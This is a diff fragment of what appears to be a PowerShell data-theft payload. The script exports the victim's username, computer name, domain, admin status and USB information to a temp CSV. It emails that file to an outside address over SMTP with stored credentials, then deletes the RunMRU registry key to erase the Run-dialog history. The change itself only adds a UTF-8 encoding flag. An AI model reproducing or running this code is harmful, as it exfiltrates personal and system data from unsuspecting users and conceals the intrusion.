@@ -44,5 +44,5 @@ $F2 = "$env:USERNAME-USB.csv"
 $u | Export-Csv -Path "$env:tmp/$F2" -NoTypeInformation
 $Body = "<h3>Username: 3333<br>ComputerName: ::<br>Domain: ww<br>Admin: xx</h3>" -replace "3333",$name  -replace "::",$computername -replace "ww",$domain -replace "xx",$admin
 
-Send-MailMessage -From $user -to $To -Subject $Subject -Body $Body -SmtpServer $SMTPServer -port $SMTPPort -Credential $cred -UseSsl -BodyAsHtml -Attachments "$env:tmp/$F2"
+Send-MailMessage -From $user -to $To -Subject $Subject -Body $Body -SmtpServer $SMTPServer -port $SMTPPort -Credential $cred -UseSsl -BodyAsHtml -Attachments "$env:tmp/$F2" -Encoding UTF8
 reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f
